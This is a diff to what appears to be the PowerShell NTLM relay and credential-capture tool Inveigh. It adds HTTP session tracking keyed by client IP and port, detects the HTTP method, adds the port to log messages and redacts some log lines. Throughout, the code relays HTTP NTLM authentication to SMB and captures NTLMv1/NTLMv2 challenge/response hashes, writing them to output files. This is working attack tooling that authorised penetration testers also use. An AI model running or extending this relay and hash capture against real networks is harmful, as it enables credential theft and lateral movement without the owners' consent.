@@ -358,6 +358,7 @@ if(!$inveigh)
     $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
     $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
     $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
+    $inveigh.TCP_session_table = [HashTable]::Synchronized(@{})
     $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
     $inveigh.group_table = [HashTable]::Synchronized(@{})
     $inveigh.session_count = 0
@@ -370,12 +371,12 @@ if(!$inveigh.running)
 {
     $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
     $inveigh.console_queue = New-Object System.Collections.ArrayList
-    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.log_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
     $inveigh.output_queue = New-Object System.Collections.ArrayList
     $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
+    $inveigh.HTTP_session_table = [HashTable]::Synchronized(@{})
     $inveigh.console_input = $true
     $inveigh.console_output = $false
     $inveigh.file_output = $false
@@ -1045,7 +1046,16 @@ while($inveigh.output_queue.Count -gt 0)
 
             if($inveigh.file_output)
             {
-                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
+
+                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] "))
+                {
+                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
+                }
+                else
+                {
+                    $inveigh.log_file_queue.Add("[redacted]") > $null    
+                }
+
             }
 
             if($inveigh.log_output)
@@ -3574,7 +3584,7 @@ $SMB_relay_functions_scriptblock =
                         $message_ID++
                         $stage_current = $stage
                         $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
-                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
+                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
@@ -5464,7 +5474,15 @@ $HTTP_scriptblock =
             $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
 
-        $inveigh.HTTP_challenge_queue.Add($ClientIPAddress + $ClientPort + ',' + $HTTP_challenge)  > $null
+        if(!$inveigh.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
+        {
+            $inveigh.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
+        }
+        else
+        {
+            $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
+        }
+
         $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)
         $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)
         $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)
@@ -5665,6 +5683,23 @@ $HTTP_scriptblock =
             $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
             $HTTP_connection_header_close = $true
 
+            if(($TCP_request).StartsWith("47-45-54-20"))
+            {
+                $HTTP_method = "GET"
+            }
+            elseif(($TCP_request).StartsWith("48-45-41-44-20"))
+            {
+                $HTTP_method = "HEAD"
+            }
+            elseif(($TCP_request).StartsWith("4f-50-54-49-4F-4E-53-20"))
+            {
+                $HTTP_method = "OPTIONS"
+            }
+            elseif(($TCP_request).StartsWith("43-4F-4E-4E-45-43-54"))
+            {
+                $HTTP_method = "CONNECT"
+            }
+
             if($TCP_request -like "*-48-6F-73-74-3A-20-*")
             {
                 $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
@@ -5683,17 +5718,17 @@ $HTTP_scriptblock =
 
             if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
             {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP") > $null
 
                 if($HTTP_header_user_agent)
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
                 }
 
                 if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
                 }
 
             }
@@ -5741,7 +5776,7 @@ $HTTP_scriptblock =
                     
                     if($inveigh.SMB_relay -and $relay_step -eq 0)
                     {
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay initiated by $HTTP_source_IP") > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) to SMB relay initiated by $HTTP_source_IP") > $null
                         $SMB_connect = Invoke-SMBConnect $process_ID_bytes $HTTP_source_IP
                         $target = $SMB_connect[1]
                         $SMB_client = $SMB_connect[0]
@@ -5814,7 +5849,17 @@ $HTTP_scriptblock =
                             $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                             $NTLM = 'NTLM ' + $NTLM_challenge_base64
                             $NTLM_challenge = Get-SMBNTLMChallenge $SMB_relay_bytes
-                            $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge) > $null
+
+                            if(!$inveigh.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
+                            {
+                                $inveigh.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
+                            }
+                            else
+                            {
+                                $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
+                            }
+
+                            #$inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge) > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
                             $relay_step = 2
@@ -5837,9 +5882,7 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_offset = Get-UInt32DataLength 24 $HTTP_request_bytes
                     $HTTP_NTLM_domain_length = Get-UInt16DataLength 28 $HTTP_request_bytes
                     $HTTP_NTLM_domain_offset = Get-UInt32DataLength 32 $HTTP_request_bytes
-                    [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
-                    $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
-                    $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
+                    $NTLM_challenge = $inveigh.HTTP_session_table.$Session
                        
                     if($HTTP_NTLM_domain_length -eq 0)
                     {
@@ -5880,17 +5923,18 @@ $HTTP_scriptblock =
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):") > $null
+                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash) > $null
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
                             }
 
                             if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
@@ -5914,17 +5958,18 @@ $HTTP_scriptblock =
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):") > $null
+                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
                             }
 
                             if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
@@ -6249,7 +6294,16 @@ $control_relay_scriptblock =
 
             if($inveigh.file_output)
             {
-                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
+
+                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] ") -or $inveigh.output_queue[0].StartsWith("[!] ") -or $inveigh.output_queue[0].StartsWith("[-] "))
+                {
+                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
+                }
+                else
+                {
+                    $inveigh.log_file_queue.Add("[redacted]") > $null    
+                }
+
             }
 
             if($inveigh.log_output)
@@ -7436,6 +7490,7 @@ function ConvertTo-Inveigh
         $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
         $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
         $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
+        $inveigh.TCP_session_table = [HashTable]::Synchronized(@{})
         $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
         $inveigh.group_table = [HashTable]::Synchronized(@{})
         $inveigh.session_count = 0
